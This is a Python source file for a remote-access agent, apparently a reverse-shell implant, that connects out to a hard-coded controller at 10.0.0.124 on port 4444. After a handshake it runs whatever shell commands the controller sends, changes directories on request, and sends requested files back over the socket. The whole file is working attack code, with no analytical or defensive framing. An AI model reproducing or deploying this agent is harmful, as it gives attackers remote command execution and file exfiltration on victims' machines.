# vx_agent.py
import socket
import subprocess
import os
from modules import comms, file_transfer

HOST, PORT = '10.0.0.124', 4444
s = socket.socket()
s.connect((HOST, PORT))

# ─── Handshake ──────────────────────────────────────────────────────────
req = comms.rrecv(s)
if not req or req.get("payload") != "[VX_HELLO]":
    s.close()
    exit()
comms.rsend(s, "[VX_AGENT_READY]", dtype="output")

# ─── Main Loop ──────────────────────────────────────────────────────────
while True:
    msg = comms.rrecv(s)
    if not msg:
        break

    cmd = msg.get("payload")
    if not isinstance(cmd, str):
        # unexpected type
        comms.rsend(s, "Invalid command format.", dtype="error")
        continue

    # Exit
    if cmd == "exit":
        break

    # Download
    if cmd.startswith("download "):
        _, fname = cmd.split(" ", 1)
        try:
            with open(fname, "rb") as f:
                data = f.read()
            comms.rsend(s, data, dtype="file", filename=fname)
        except Exception as e:
            comms.rsend(s, str(e), dtype="error")
        continue

    # Change directory
    if cmd.startswith("cd "):
        try:
            os.chdir(cmd.split(" ", 1)[1])
            comms.rsend(s, os.getcwd(), dtype="output")
        except Exception as e:
            comms.rsend(s, str(e), dtype="error")
        continue

    # Shell execution
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        comms.rsend(s, out, dtype="output")
    except subprocess.CalledProcessError:
        comms.rsend(s, f"{cmd} is not a valid shell command.", dtype="error")
    except FileNotFoundError:
        comms.rsend(s, f"{cmd} was not found.", dtype="error")
    except Exception as e:
        comms.rsend(s, f"Unexpected error: {e}", dtype="error")

s.close()
